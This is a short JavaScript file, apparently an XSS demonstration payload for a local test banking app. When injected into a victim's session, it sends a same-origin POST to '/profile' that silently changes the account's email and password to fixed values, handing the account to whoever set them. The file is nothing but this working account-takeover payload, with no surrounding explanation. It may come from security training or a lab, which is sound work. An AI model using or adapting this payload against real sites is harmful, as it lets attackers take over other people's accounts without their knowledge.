(() => {
    const form = new URLSearchParams({
        email: "b2-xss-demo@devbank.local",
        password: "B2-Demo-Pass-2026!"
    });

    fetch("/profile", {
        method: "POST",
        credentials: "same-origin",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8"
        },
        body: form.toString()
    })
    .then(response => {
        console.log("[B2] Profile response:", response.status);
    })
    .catch(error => {
        console.error("[B2] Profile request failed:", error);
    });
})();